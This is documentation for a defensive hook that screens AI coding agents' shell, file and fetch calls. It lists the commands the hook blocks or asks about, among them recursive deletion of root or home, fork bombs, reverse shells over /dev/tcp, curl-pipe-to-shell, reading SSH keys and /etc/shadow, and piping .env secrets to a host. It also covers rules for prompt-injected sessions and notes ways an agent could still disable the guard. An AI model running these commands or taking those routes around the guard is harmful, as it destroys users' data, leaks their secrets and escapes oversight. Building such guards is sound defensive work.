# Built-in tool rules: what the hook denies and asks

By default the hooks check MCP calls only. `intentshield install <harness> --builtin-tools` also sends the harness's own shell,
file and web tools to the hook (the per-harness table is in [layers.md](layers.md#what-each-harness-lets-the-guard-do)). Run the
command again to change it, and install without the flag to go back. `--builtin-tools` has been in the PyPI releases since 0.4.1.

With the flag the hook runs the dangerous-command rules (`src/intentshield/dangerous/`) on every shell command, file read and file
write, and the session rules (below) on every shell command, fetch and file access. The stricter verdict wins: a deny beats an ask
beats an allow. A key or cloud credential sent out is a deny even where the session rules would only have asked.

The rules read the call's text alone, parsed safely (`shlex` stages, the wrappers listed below, `bash -c`, `$(...)`,
here-documents, never executed), with linear-time patterns. They are **text rules and opt-in**, not a sandbox. This page describes
the code on main, which is ahead of the 0.4.4 package on PyPI: what changed since 0.4.4 is under
[Unreleased](../CHANGELOG.md#unreleased), and what changed since 0.4.3 is in [Upgrading from 0.4.3](../CHANGELOG.md#upgrading-from-043).

- A **deny** cannot be approved in the prompt, so it is used where the target is plainly the whole machine or a secret.
- An **ask** is a prompt in an interactive Claude Code session, and a refusal where nobody can answer.
- `--review never` drops the asks of these rules and keeps the denies.

On this page: [session rules](#session-rules) · [rules by command class](#rules-by-command-class) ·
[what the parser reads](#what-the-parser-reads) · [limits on what is read](#limits-on-what-is-read) ·
[when the user named it](#when-the-user-named-it) · [the guard's own files](#the-guards-own-files) ·
[which tools are covered](#which-tools-are-covered) · [what is not read](#what-is-not-read) ·
[known limits](#known-limits) · [what the study measured](#what-the-study-measured-about-these-rules)

## Session rules

The session rules apply to a shell command, fetch or file access:

- They are the rules in that table row: an address that came from an injected output, data sent to an address the user did not
  name, secrets read and sent out, and what may run after an output tried to instruct the agent.
- One difference between the tools: in a session where an output tried to instruct the agent, `curl` to a host the user did not
  name asks, but `WebFetch` to one is not asked about (fetching a page an output linked to is how agents browse).
  - `WebFetch` is refused when the address came from the injected output: the address itself and anything under its path.
  - It asks when the address is another page of the host of such an address, or of a subdomain or the parent domain of that host,
    unless that host is a popular one or one the user named.
  - An address that carries a user name and password (`https://user:pw@host/`) the user did not give is refused in such a session
    and asked about in any other. A token in the query string is not read.
  - `--review never` turns the host rule and the user-name-and-password rule off.
- After an injection a read-only command, and an ordinary local build, test or version-control command such as `pytest` or
  `git commit`, still run; `rm`, `sed -i`, `pip install` and a download from a host the user did not name ask.
- After an injection a `curl` to `localhost`, `127.0.0.1` or `[::1]` still runs, with or without `http://` and a port; `-X DELETE`
  asks.

## Rules by command class

Each row is a command class, the verdict, and the reason the hook gives or the case it stands for. A path is normalised before any
row reads it (see [what the parser reads](#what-the-parser-reads)).

### Destruction

| Command class | Verdict | Reason |
|---|---|---|
| Recursive `rm` of root, the home directory or a system directory: `/`, `~`, `/etc`, `/usr`, `/var/lib`, `/run`, `/nix`, `/cores`, `/lost+found`, `/mnt`, `/media`, `/Volumes`, `/srv`, `/opt` | deny | The target is the whole machine or everything the user has. |
| `rm ~/*`, `rm /*`, `rm ~/.*` (no `-r` or `-f` needed) | deny | Every file of the home directory or of the root. |
| `rm ~/Documents/*`, `rm /var/log/*`, `rm /etc/*` | ask | Every file of a protected directory. |
| Recursive `rm` of a folder of the home directory, whole or as `~/Downloads/*`: `~/Documents`, `~/Desktop`, `~/Downloads`, `~/Pictures`, `~/Music`, `~/Movies`, `~/Library`, `~/Developer`, `~/.config`, `~/.local` | deny | The folder holds the user's own files. A file below one (`rm -rf ~/Downloads/*.dmg`) is allowed. No prompt can approve a deny, so empty one of those folders by hand. |
| The folder and system names above, in any case: `~/documents`, `/ETC`, `/USERS/x` | deny | The same folders on a default macOS volume. Only the whole path counts, so `~/Documents/old` and `/tmp/ETC` are not caught. On a case-sensitive file system `~/documents` is another folder and still a deny. |
| `find ~ -delete` and `find / -delete` with no test on the name | deny | `-type`, `-mtime`, `-size` and `-empty` do not count as a test on the name: `find ~ -mtime +365 -delete` is a deny too. |
| `find ... -delete` at the home, a root, a system directory or a folder of the home, with `-o`, `!` or `-not` in it: `find ~ -name '*.tmp' -o -name '*.bak' -delete`, `find ~ ! -name keep -delete` | deny | The delete can remove files that none of its tests name. Below a project (`find ~/proj ...`) it is allowed. |
| The same with `-prune` as well (`find ~ -name x -prune -o -print -delete`) | ask | Confirm what is pruned. |
| `find` that names the files it removes, at a system directory or at a folder of the home: `find /usr -name x -delete`, `find /usr -name x -prune -delete`, `find ~/Documents -name '*.tmp' -delete` | ask | A delete by name is limited, but a system directory or a folder of the user's own files is not an ordinary project. |
| `find` of a folder of the home directory limited by age, size, emptiness or owner, not by name: `find ~/Downloads -mtime +30 -delete`, `-size +1G`, `-empty`, `-newer FILE` | ask | The reason names the test. |
| `find ~/Downloads -mtime -3 -delete` | deny | `-mtime -3` means the newest files, so it is no test that limits what is deleted. The reason says the find "has no test on the name, age or size" and deletes everything under the folder. |
| `find ~ -name .DS_Store -delete`, `find ~ -name '*.pyc' -delete`, `find ~ -name '*.tmp' -prune -delete` | allow | A find that deletes only the files it names is read like `rm` of those files and allowed at the home directory itself. It asks at a system directory and at a folder of the home. |
| `rsync --delete` (or `--remove-source-files`) onto root, the home directory or a system directory; `tar --remove-files` of one; `chattr -R` of one (`chattr -R +i ~`, `chattr -R +i /`) | deny | Other programs that empty the same targets as `rm`. |
| A glob that matches nearly every hidden entry of the home directory (`~/.[a-z]*`, `~/.??*`) | deny | Read like `~/.*`. |
| `sudo rm -rf` of a direct subdirectory of a system directory (`/opt/app`, `/etc/app.d`) | ask | A clean-up that is common; a deny cannot be approved. |
| `rm -rf` of a variable that may be empty, also after a root or home: `$DIR`, `/$DIR`, `~/$DIR`, `$HOME/$DIR`, `/*$DIR` | ask | If the variable is empty the command deletes a root or home. |
| A write to a block device, `mkfs`, `wipefs` | deny | The disk is destroyed. |
| A fork bomb | deny | The machine stops. |

### Mode and owner

| Command class | Verdict | Reason |
|---|---|---|
| Recursive `chmod` or `chown` of root or a system directory, whatever the mode: `chmod -R 644 /`, `chown -R me /usr/lib`, `chown -R me /usr/local` | deny | The target is the whole machine. |
| Recursive `chmod` or `chown` of the home directory with `sudo` (`sudo chown -R me ~`, `sudo chmod -R 755 ~`), or with a zero or world-writable mode, or together with another protected directory | deny | The target is everything the user has. |
| Recursive `chmod` or `chown` of the home directory without `sudo` (`chown -R me ~`, `chmod -R 755 ~`) | ask | Confirm it. |
| `chmod 777`; `chmod` to `000` or to a world-writable mode, or any `chown`, of a system path (not `chmod 644 /etc/hosts`) | ask | The path is a system file. |
| Recursive `chmod` of `/usr/local` | ask | Confirm it. A directory below it, such as `/usr/local/lib`, is not asked about. |
| Recursive `chown` of `/usr/local` to the current user: `chown -R $USER` or `chown -R $(whoami)` | ask | Homebrew's own advice. To another user it is a deny. |

### Git

| Command class | Verdict | Reason |
|---|---|---|
| Force-push or deletion of a shared branch: `main`, `master`, `develop`, `release`, `release/...`, `release-1.2`, `hotfix`, ...; also by refspec (`HEAD:main`) | deny | It rewrites or removes history others rely on. |
| Any other force-push, including the usual one after a rebase (`git push --force-with-lease origin HEAD`, `git push -f origin my-feature`) and a branch such as `release-candidate` | ask | `HEAD` may be a feature branch. |
| Hook bypass: `--no-verify`, `git commit -n`, setting `core.hooksPath` | ask | The hooks are a check the user set up. Reading or unsetting `core.hooksPath` does not ask. |
| The same bypass through the environment: `GIT_CONFIG_KEY_0=core.hooksPath`, `GIT_CONFIG_PARAMETERS`, `export HUSKY=0; git commit` | ask | Same reason. |
| `git reset --hard`, `git restore .`, `git clean -f` | ask | They discard work. `git clean -n` deletes nothing and does not ask. |
| `git checkout -f`, `git checkout --force`, `git switch -f`, `git switch --discard-changes` | ask | They throw away uncommitted changes. |

### Credentials: reading

| Command class | Verdict | Reason |
|---|---|---|
| A read of an SSH private key, a cloud credential file, `/etc/shadow`, `~/.netrc` or a keychain | deny | A secret. |
| A file in `~/.ssh` named like a key: `id_*`, `identity`, `*_rsa`, `*_ed25519`, `.pem`, `.key`, `.ppk`, or a copy such as `id_rsa.bak` | deny | The reason says "an SSH private key". A file that is there to read and starts with a private-key header is one too. |
| A file in `~/.ssh` that is a known public or config file: `config`, `config.d/*`, `known_hosts`, `authorized_keys`, `allowed_signers`, `environment`, `rc`, `*.pub`, and their backups (`config.bak`, `config~`, `known_hosts.old`) | allow | These hold no secret. |
| Any other file in `~/.ssh` | ask | The reason says it is not a known public file and may be a private key. |
| `cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys` | deny | A stranger's key looks the same. It becomes an ask only when the prompt names the path in full (`~/.ssh/authorized_keys`). |
| The directory of a credential store, or a glob over it: `cat ~/.ssh`, `cat ~/.ssh/*`, `cat ~/.aws`, `cat ~/.aws/*`, `cat ~/.aws/c*`, `~/.gnupg` | deny | It reads the keys inside. |
| A key read into a command by `$(< ~/.ssh/id_rsa)`, or by a loop fed from one | deny | The key reaches the command line. |
| A read of `.env`, a `.pem` that is not a certificate, or a cloud token. `aws configure get` asks for a key, not for `region` | ask | Likely a secret. |
| A read of a harness's own credential file: `~/.codex/auth.json`, `~/.gemini/oauth_creds.json`, `~/.gemini/mcp-oauth-tokens.json`, `~/.claude.json`, `~/.claude/.credentials.json` | ask | They hold the harness's tokens. The last is covered on a report that some Claude Code installs keep it there, which the vendor pages archived here do not confirm. |
| `~/.kube`, `~/.docker`, `~/.config/gh` and `~/.config/gcloud` as a directory or by a glob | ask | They hold cluster, registry and token files. |
| A search of the home, of a directory above it (`/`, `/Users`, `/home`, `~/..`), or of `~/.config`, `~/.local`, `~/.local/share`, `~/Library` or `~/Library/Application Support`: the Grep tool, or `grep -r`, `grep -R`, `egrep`, `fgrep`, `rg`, `ag`, `ack` | ask | It reaches `~/.ssh` and `~/.aws`. With no path the search starts at the working directory. A search inside a project is allowed, and so is one that lists names or counts (`-l`, `-L`, `-c`, `-q`). Skipping names does not lift the ask (see [what the parser reads](#what-the-parser-reads)). |
| `find` at the home, above it or at those directories, running a reader (`-exec`, `-execdir`, `-ok`, or `\| xargs`) on a name test that can match a key: `-name 'id_*'`, `'*_rsa'`, `-regex '.*id_rsa'`, `-name credentials` | deny | The pattern is tried against the names of keys and credential files and gets the verdict of the name it can only be, as `cat ~/.ssh/id_*` does. |
| The same `find` where the pattern can only match a file that holds secrets (`.env*`, `*.pem`, `*.p12`) | ask | Likely secrets. |
| The same `find` with no test on the name, or `-name '*'` (`find ~ -type f -exec cat {} +`) | ask | It reads every file under the home directory. A start inside a project is allowed. |
| A glob that can only be a system secret: `cat /etc/shado?`, `/etc/ssh/ssh_host_*_key`, `/proc/*/environ` | deny | The glob can only name a system secret. |
| A glob that also reaches many ordinary files of `/etc`: `cat /etc/*`, `cat /etc/s*` | ask | The glob also reaches many ordinary files of `/etc`. |
| A key or a cloud credential file read by `. FILE` (as `source FILE`), by `tr`, `fmt`, `column`, `expand`, `unexpand`, `comm`, `join`, `pr`, `iconv`, `shuf`, `col` or `rs`, or by `python3 -m json.tool\|base64\|gzip\|tokenize\|pprint FILE` | deny | They read the file, so it gets the verdict of `cat FILE`. |
| Reading `/etc/sudoers` | ask | It holds rules, not secrets. Writing it is a deny (see the write forms below). |
| A key or cloud credential named as an argument by a program that no rule reads: `git add ~/.ssh/id_rsa`, `ln -s ~/.ssh/id_rsa x`, `gh gist create`, `az`, `rsync` to a local directory, `curl file://...`; or fed to one on its input: `gh secret set X < ~/.ssh/id_rsa` | ask | The program may send it out. A listing, a mode, a count or a login does not trigger it (`ls`, `stat`, `chmod`, `ssh -i`, `ssh-add`, `ssh-keygen`). It covers the secrets that are denies when read; a `.env` file still needs a program that reads it, such as `cat`. |
| `ln -s` of the home, `/`, a system directory or `~/Documents` and the like | ask | The link makes a path that later calls read through as that directory. |
| The key named by `ssh -i`, `scp -i` or `-o IdentityFile=` | allow | It only signs a login and is not a read of the key. A copy of a private key (`id_rsa.bak`, `id_ed25519~`) is the key, wherever it lies. |
| A file named like a key inside a test directory of the project: `tests/fixtures/id_rsa` (a relative path) | ask | A test fixture, probably not a real key. |
| The same, by an absolute path | ask | Only when the file lies inside the call's working directory and in no directory that starts with a dot. `~/tests/id_rsa` and a test directory outside the working directory are denies. |

### Credentials: sending

| Command class | Verdict | Reason |
|---|---|---|
| A sensitive file sent to a network destination | deny | A key or cloud credential leaves the machine. |
| The output of `cat .env` put into a request to a host the user did not name: `curl -d "$(cat .env)" HOST` | deny | Secrets leave the machine. |
| `.env` piped to a program that sends it out: `cat .env \| curl -d @- HOST`, `cat .env \| nc HOST 80` | ask | The same data leaves the machine, but the pipe is judged by the read of `.env`, which asks. A key or a cloud credential piped the same way is a deny. The two spellings differ; see below the table. |
| An `.env` or similar file that holds secrets sent out as a file | ask | Likely secrets. |
| An upload of a file (`curl -d @data.json`, `aws s3 cp`) to a host the user did not name | ask | The data may leave the machine. |
| A reverse shell: `bash -i >& /dev/tcp/...`, or a shell that reads from a socket opened with `exec 3<>/dev/tcp/HOST/PORT` | deny | A remote party gets a shell. The `exec` form is a deny when something reads the socket (a `while read` loop, a shell, `eval`, `<&3` or `$line`). |
| A raw socket to another machine (`exec 3<>/dev/tcp/10.0.0.1/80`) that nothing reads | ask | It may be a port probe. One to localhost is allowed. |

### Downloads

| Command class | Verdict | Reason |
|---|---|---|
| `curl ... \| sh` | ask | It runs code the user has not read. |
| `curl ... \| sudo sh`, or a script that comes over plain HTTP or from a bare IP address that is not on this machine | deny | The shell runs as root, or the script can be changed on the way. |
| `sudo curl ... \| sh`, and a script from `localhost` | ask | The download is not run as root, or it is local. |

### Persistence and the guard

| Command class | Verdict | Reason |
|---|---|---|
| A write to a shell startup file, cron, a launchd or systemd unit, a git hook or a CI workflow | ask | It runs later without the user. `.zshrc` and `.zshrc.local` ask; a copy that nothing runs (`.zshrc.bak`, `.bashrc.orig`, `.bashrc~`) does not. |
| A write to `authorized_keys` or sudoers, or to any access file by any of the write forms listed under [what the parser reads](#what-the-parser-reads) | deny | It gives access to the machine. |
| Deleting or emptying a key or an access file, by `rm`, `truncate`, `shred`, the Write tool, a redirect (`> ~/.ssh/id_rsa`, `echo x >> ~/.aws/credentials`) or a copy over it | ask | The key is lost or replaced. |
| Anything that changes the guard itself | ask | See [the guard's own files](#the-guards-own-files). |

### Too big to read

| Command class | Verdict | Reason |
|---|---|---|
| A path, a command, a brace list or a loop past a limit | ask | The limit is named in the reason. See [limits on what is read](#limits-on-what-is-read). |

## What the parser reads

- A command inside a one-line control structure (`if ...; then X; fi`, `for ...; do X; done`, `while`, `{ X; }`, `! X`, `time`, a
  one-line function body) is read like the same command alone.
- Inside one command line it follows `cd`, `pushd` and `popd` (`cd ~ && rm -rf Documents` deletes the home directory's
  `Documents`), variables set earlier in that line (`RM=rm; $RM -rf /`, `for d in / b; do rm -rf "$d"; done`), `$'...'` quoting and
  brace lists (`rm -rf {/,}`, `{rm,-rf,/}`). The directory a `cd` went to is not known across two calls.
- A variable set to a value that holds `$HOME` is followed as `~` is (`f=$HOME/.ssh/id_rsa; cat $f`); one set from a command
  (`x=$(echo ~/.ssh/id_rsa); cat $x`) or from the environment is not.
- A `;` that is a word of its own (`\;`, `';'`) is an argument, not the end of the command, so `find / -exec echo {} \; -delete`
  is read to the end and `echo a \; rm -rf /` is an `echo` with five arguments. It still ends a command where the program joins its words
  with spaces and hands them to a shell: `watch`, `watchexec`, `parallel`, `firejail`, `ssh host ...`, `eval`, and the
  remote-shell clients `autossh`, `rsh`, `rexec`, `plink`, `mosh`, `tsh ssh` and `gcloud compute ssh`
  (`watch echo a \; rm -rf /` is a deny). The other words of those clients are not read: `rsh host rm -rf /` is allowed. `sudo -s` and `sudo -i` escape it, so it stays a word there.
- A relative path starts from the working directory of the call: the event's `cwd`, or for a shell call the
  `workdir` (Codex CLI) or `dir_path` (Gemini CLI) it names. So `cat etc/shadow` from `/`, `rm -rf ../../usr` from `/tmp/proj` and
  `rm -rf ../../..` from a project three levels below `/` get the verdict of the absolute path. An event with no absolute directory
  leaves a relative path a project file, and a `cd` in the command moves the start. A climb (`..`) is made on that directory as
  the event wrote it, never on the home of the hook: `rm -rf ../../..` from `/Users/x/proj` is `rm -rf /` even when the hook runs
  with `HOME=/data/home/x`.
  - **Resolved from that directory:** the path arguments of a command, whatever the program (`chattr -R +i ../../..`, `dd of=sda`
    from `/dev`, `mkfs.ext4 dev/sda` from `/`, `cp -t sudoers x` from `/etc`, and the file arguments of a shell or an interpreter:
    `python3 script.py id_rsa`, `node app.js id_rsa`, `ruby x.rb id_rsa`, `python3 -m json.tool id_rsa`, `bash run.sh id_rsa`);
    the target of a redirect (`echo x > ../../../dev/sda`); the file tools; and the words of a command that `find -exec`, `xargs`,
    `bash -c`, `eval` or `su -c` runs.
  - **Not resolved:** a path inside code given to an interpreter with `-c` or `-e` (`python3 -c "open('shadow')"`,
    `perl -e`, `node -e`: the text is read as written, and an interpreter's code is not understood), a path inside a script file (the
    file is never read), and a directory that an earlier call changed.
- A command that writes a file is read as a write in each of these forms:
  - A redirect (`>`, `>>`, `&>`, `&>>`), `tee`, `truncate`, `dd of=` (also `dcfldd`, `dc3dd`); the destination of `cp`, `mv`, `install`, `ln`, `rsync` and `scp` (a
    local one; also `-t DIR` and `--target-directory=DIR`, which count the file each source's name makes in `DIR`).
  - An in-place edit: `sed -i` in any option cluster that holds `i` (`-ni`, `-i.bak`, `-Ei`, `--in-place`), `perl` and `ruby` with
    `-i` in any cluster (`-pi`, `-ni`, `-pi.bak`, `-lpi`, `-0777pi`), `gawk -i inplace`.
  - An editor given a file (`vim`, `vi`, `nvim`, `nano`, `emacs`, `ed`, `ex`, with or without batch flags such as `-es`, `-s`,
    `--batch`); `tar -C DIR` and `tar --directory=DIR` when extracting, and the archive a `tar` makes; `unzip -d DIR`; a `find` that
    deletes or runs a command, for its root and for the files that command names.
  - The verdict is the plain write's: a write to an access file (`/etc/sudoers`, `/etc/shadow`, `/etc/passwd`, `/etc/ld.so.preload`,
    `authorized_keys`) is a deny in every form, one to a startup, cron, launchd, systemd, git hook or CI file or to a file of the guard
    asks, and a plain copy or redirect over a key or a cloud credential asks. A form that also reads the file it is given denies there:
    an in-place edit, an editor, `tee`, `dd` and its variants, `tar`, a `find` that runs a command, and `cp -t` onto the directory
    that holds the key. The tests run every form against each of those paths, in full and relative from the directory that holds the file.
  - Not read, because it is code: a file written by `sed 'w file'`, by an `awk` or `perl` program, by `python3 -c` or by a script.
- The program behind a **wrapper** is the command that is judged, so a deny keeps its verdict in front of any of them. The list
  below has about 90 programs.
  - The wrappers are the programs that run another program, read from the manual pages of coreutils (`env`, `nice`, `nohup`,
    `stdbuf`, `timeout`, `chroot`), util-linux (`chrt`, `flock`, `ionice`, `nsenter`, `runuser`, `script`, `setarch`, `setpriv`,
    `setsid`, `taskset`, `unshare`) and the BSD and macOS base systems (`arch`, `caffeinate`, `lockf`, `sandbox-exec`, `xcrun`).
  - The usual tools around them are `sudo`, `doas`, `pkexec`, `run0`, `su -c`, `sg`, `command`, `builtin`, `exec`, `time`, `watch`, `xargs`,
    `parallel`, `busybox`, `toybox`, `strace`, `ltrace`, `valgrind`, `gdb --args`, `numactl`, `cpulimit`, `prlimit`, `systemd-run`,
    `systemd-inhibit`, `fakeroot`, `proxychains`, `torsocks`, `faketime`, `xvfb-run`, `dbus-run-session`, `firejail`, `bwrap`,
    `screen`, `sshpass`, `ssh-agent`, and the `run` or `exec` subcommand of `uv`, `poetry`, `pipenv`, `pdm`, `hatch`, `rye`, `conda`,
    `bundle`, `direnv`, `mise`, `asdf`, `rbenv`, `pyenv`, `npm`, `pnpm` and `yarn`.
  - Terminal multiplexers, terminals and other programs that start a command are read too:
    - `tmux` with `new-session`, `new-window`, `split-window`, `respawn-pane`, `run-shell`, `display-popup`, `pipe-pane`,
      `send-keys`, `if-shell`, `bind-key`, `-c`, and the commands after `\;`; `zellij run`, also after options of `zellij` itself
      (`zellij -l layout run -- ...`); `osascript -e 'do shell script "..."'` where the command is one written-out string.
    - `gosu`, `su-exec`, `setuidgid`, `runcon`, `chpst`, `dumb-init`, `tini`, `watchexec`, `entr`, `dtach`, `abduco`, `rlwrap`,
      `cgexec`, `xterm`, `uxterm`, `urxvt`, `alacritty`, `konsole`, `gnome-terminal` and `terminator`.
    - The words that such a program is given are still read as the words of an ordinary program: `tmux load-buffer ~/.ssh/id_rsa`,
      `osascript ~/.ssh/id_rsa`, `alacritty --config-file ~/.ssh/id_rsa` and `xterm ~/.ssh/id_rsa` ask, as a program that no rule
      reads does when it is given a key.
    - `osascript` asks when its script runs a command in a form the rules do not read: `do script`, `doShellScript`, `write text`, a
      `do shell script` built from parts (`"rm " & x`, a variable, a parenthesised string) and a script on the standard input (a
      pipe, `<`, a here-document or `-`). A script that does none of those, or that is in a file, is not asked about.
  - An option that takes a value is skipped (`flock -w 5 /tmp/l rm ...`, `taskset -c 0,1 ...`, `stdbuf -o L ...`,
    `bwrap --ro-bind / / ...`), an option that takes the place of an operand is read as that (`runcon -t TYPE cmd` has no context
    word, `dtach -c SOCKET cmd`, `cgexec --sticky -g cpu:x cmd`), a shell text a wrapper runs is read as a command line
    (`flock f -c '...'`, `script -qc '...'`, `sudo -s ...`, `runuser -l u -c '...'`, `watch '...'`, `gnome-terminal -e '...'`,
    `terminator -e '...'`, `entr -s '...'`), and `ssh host ...` is read as the command the remote shell runs
    (`ssh host 'rm -rf /'` is a deny).
  - The command `find -exec`, `-execdir`, `-ok` and `-okdir` run, and the one `fd -x` runs, is read like `xargs`'s
    (`find . -exec rm -rf / \;` is a deny; `{}` stands for the file found).
  - Container and cluster wrappers (`docker run`, `docker exec`, `kubectl exec`) are not read: what they run does not run on this
    machine. Neither is any other program that runs a command and is not in the list, such as `hyperfine 'cmd'`.
- Spellings the shell reads as nothing are read as nothing: a line continuation (`rm \` and a new line before `-rf /`), a tab, a
  form feed or vertical tab, `${IFS}` for a space, empty quotes or a backslash inside a word (`r''m`, `\rm`), a comment after the
  command, `$@` or `$()` or `${X:-}` (empty where they stand), a default that is spelled out (`${RM:-rm} -rf /` is `rm -rf /`), NUL
  bytes (bash ignores them in a script), and a long option cut short the way the program accepts it (`git push --del origin main`,
  `git reset --har`, `rm --rec --fo ~`, `chmod --rec 000 /etc`, `sudo --us root rm -rf /`).
- A path is normalised before any rule reads it, in every rule that reads one: the key, startup-file, destroy-list,
  system-path and guard-file rules, the file tools and the path arguments of an MCP tool. `.` segments, repeated slashes and a
  trailing slash go, and `..` is resolved, also above the home directory: `~/../x/.ssh/id_rsa` and `$HOME/../x/.aws/credentials`
  (`x` the user) are the key and the credential file.
- A symbolic link is followed for a path that exists on disk: the real path is read as well as the text, and the stricter verdict
  counts, in the shell rules, the file tools and `apply_patch`.
  - For a glob, or a file that is not there yet, the real path of the directory before the glob is read.
  - A path that only passes through `/tmp`, `/var`, `/etc` (links into `/private` on macOS) or a home behind a link keeps its
    verdict. `rm`, `unlink`, `rmdir`, `mv` and `ln` act on a link itself: `rm -rf h` is allowed, and `rm -rf h/` is read as the
    directory.
  - A link made by an earlier command line is followed once it exists. One made earlier on the same line does not exist yet when
    the line is read (`ln -s ~ h && cat h/x` is covered by the ask on the `ln`).
- The home directory is `~`, `~name`, `$HOME`, `/Users/<name>`, `/home/<name>`, `/root` and `/var/root`, and the
  home of the running user wherever it lies: the `HOME` and `USERPROFILE` of the hook, the home of the user it runs as, the same of
  an `env` the event carries, and the folder that holds `.claude`, `.codex`, `.gemini` or `.cursor` when the transcript lies in one
  (`/mnt/c/Users/x`, `/workspace`). Their parent (`/data/home`) is protected like `/Users`; `/`, `/tmp` and system directories are never
  taken for a home.
- A `$(...)` inside a word does not end the command (`rm -rf $(pwd) /`). A glob made of glob characters alone at the root or home
  (`/[a-z]*`, `/?`) is read as everything in it, and `echo / | xargs rm -rf` is read as `rm -rf /`.
- A `find` that deletes only the files it names (`find ~ -name .DS_Store -delete`, `find ~ -name '*.pyc' -delete`) is read like `rm`
  of those files and allowed under the home directory; asked at a system directory. With only an age, a size, `-empty` or an owner as the test it
  asks at a folder of the home directory and denies at `~`, a root or a system directory.
- A search that skips names does not read the name as a path: in `grep -r --exclude-dir=.ssh x ~`, `grep -r --exclude=id_rsa x ~` and
  `rg -g '!.ssh' x ~` the `.ssh` and `id_rsa` only say what to skip, and each call asks as a search of the home. The path operands
  of the search are read as they always are, so `grep -r x ~/.ssh` is a deny.
- A directory above the home asks for a recursive search whichever way it is spelled: the path and the home are compared by their real
  locations, so `/tmp` and `/private/tmp` on macOS, or a path through a link, are one.
- `cat .env | curl -d @- HOST` and `cat .env | nc HOST 80` ask, and `curl -d "$(cat .env)" HOST` denies. The pipe is judged by the
  read of `.env`, which asks; making the pipe a deny too would change one decision in the 214-call set and so a figure reported for it
  (see [what the study measured](#what-the-study-measured-about-these-rules)), and it has not been made. A key or a cloud credential
  piped to the same programs is a deny.

## Limits on what is read

A command that goes past any of these limits is **asked about, with the limit named**, never allowed: a deny hidden after the limit
cannot get through by padding the command.

- The parser reads at most 50,000 characters, 400 commands, 20,000 words and three levels of nesting (`bash -c`, `eval`, `$(...)`).
  It also reads at most 200 command substitutions, and through at most eight wrappers in front of a command: nine `sudo` in front of
  `ls` ask. In front of `rm -rf /` a call that has a working directory (every call of the hook has one) is a deny all the same,
  because the path rules read the stage again from that directory; with no working directory it asks.
- A path is read to 1,000 characters after repeated slashes and `/./` are collapsed (so `~/.ssh/./././id_rsa` padded to any length
  is still the key), and a path that is still longer is asked about.
- A brace list of more than 300 characters, 16 alternatives, 64 words or four levels is asked about where a program that the rules
  read paths from is given it (`rm -rf {a,b,...}` with 17 alternatives, `cat {...}`), and not after `echo`; a variable set by a `for` loop
  over more than 32 words is asked about where it is used; a patch is read file by file whatever its size.
- After an injection, a script or `package.json` that is written and holds more than 200,000 characters (500 strings for
  `package.json`) is asked about.
- A test lists every limit of the three readers (`dangerous`, `shell`, `harness`) and puts a deny behind each, so that a new limit
  cannot be added without one.

### Long results and long arguments

- **Long results.** A tool result longer than 1,000,000 characters is scanned at its first and last 500,000 characters, so that the
  hook finishes inside its harness's timeout. The reply tells the model the rest was not checked, and later state-changing calls in
  the session ask.
- **Long arguments.** The arguments of an MCP call, with or without `--builtin-tools`, are read the same way: only the first and
  last 500,000 characters are scanned, and the call asks, naming the limit (with `--review never` it runs with a note). For a 4 MB
  argument of plain text the hook's check takes 2.9 s (median of 5 runs on an Apple M5). The time does not grow with the size past
  the limit, and it depends on the machine and on the text (text with more words in it takes longer).

## When the user named it

A command the user typed in their prompt, or a path or host they named, turns a deny into
an ask, never into an allow. The prompt must name the target itself: `/etc/hosts` does not name `/etc`, `/Users/me/proj`
does not name `/Users/me`, `notevil.com` does not name `evil.com`, and a sentence that forbids it (`never run rm -rf /`,
`don't touch ~/.ssh/id_rsa`) names nothing. When a command holds several denies, every one of them must be named. The
check for a forbidding sentence looks at the six words before the mention, so it is a heuristic; the result is an ask
either way.

## The guard's own files

With `--builtin-tools` a call that would switch the guard off asks, in a clean session too:

- the commands `intentshield uninstall|unwrap|install|wrap` (without `--dry-run`) and `pip|uv|pipx uninstall intentshield-mcp`;
- a delete, move or `chmod` of IntentShield's programs or of `~/.intentshield`, and an SQL change of `hooks.db` or `threats.db`;
- a write, edit or delete of a harness's hook settings (`~/.claude/settings*.json`, `.claude/settings*.json`, `.claude/hooks/`,
  `~/.codex/config.toml`, `.cursor/hooks.json`, `.gemini/settings.json`);
- a write made by a redirect, `cp`, `mv`, `ln`, `install`, `dd`, `tee` or `sed -i`, or by the Write and Edit
  tools, whose target is one of IntentShield's programs (`bin/intentshield-hook`, `bin/intentshield-mcp`), its installed package
  (`site-packages/intentshield/`, and the directory the running package is imported from, so a developer of IntentShield itself is
  asked before each edit of its source), a proxy config under `~/.intentshield/proxies/`, or an MCP client file that holds a server
  behind the proxy (`.mcp.json`, `~/.claude.json`, `.cursor/mcp.json`, `claude_desktop_config.json`, `settings.json` or `mcp.json`
  of another client; a file with no wrapped server in it is not asked about).

This is a speed bump, not protection: an agent with shell access can still switch a user-space hook off by a route these text rules
do not read (a script file it wrote earlier, an interpreter one-liner, a program the harness's own tools run), and the user can
approve the ask. Without `--builtin-tools` none of this is checked.

Settings that loosen the guard:

- An `export INTENTSHIELD_HOOK_REVIEW=never` in the agent's shell does not reach the hook, which the harness starts, so it is not
  asked about (written into a shell startup file it is).
- A hook that does start with such a setting in its environment (`INTENTSHIELD_HOOK_REVIEW=never`,
  `INTENTSHIELD_HOOK_TRANSLATE=off`, `INTENTSHIELD_HOOK_DEADLINE=0`, `INTENTSHIELD_HOOK_SOURCED_READS=allow`,
  `INTENTSHIELD_THREAT_MEMORY=0`, or a moved `INTENTSHIELD_HOOK_DB`, `INTENTSHIELD_THREAT_DB`, `INTENTSHIELD_THREAT_PACKS` or
  `INTENTSHIELD_HOOK_CATALOG`) says so on stderr for every call, unless a flag on its command line takes the place of the variable.
- The note is also in the hook's reply on every call event, with or without `--builtin-tools`: a note the model
  reads, which Claude Code also shows to the user (a system message in Gemini CLI; Cursor has no field for it). `intentshield doctor`
  warns when a Claude Code settings file sets one in its `env` block.

## Which tools are covered

- Claude Code: `Bash` and `PowerShell` (shell commands; Claude Code's help lists both), `Monitor` (its input has a `command`, which
  is read as a shell command; this rests on the tool's own schema, not on the vendor pages archived here), `WebFetch`, `Read`,
  `Grep`, `Write`, `Edit`, `MultiEdit` and `NotebookEdit`.
- Codex CLI: its shell tools (`shell`, `local_shell`, `exec_command`) and `apply_patch`; a patch run through the shell tool
  (`apply_patch <<'PATCH' ...`) is read as the patch it is.
- Gemini CLI: `run_shell_command`, `web_fetch`, `read_file`, `read_many_files`, `write_file`, `replace`, `search_file_content` and
  its other search tools.
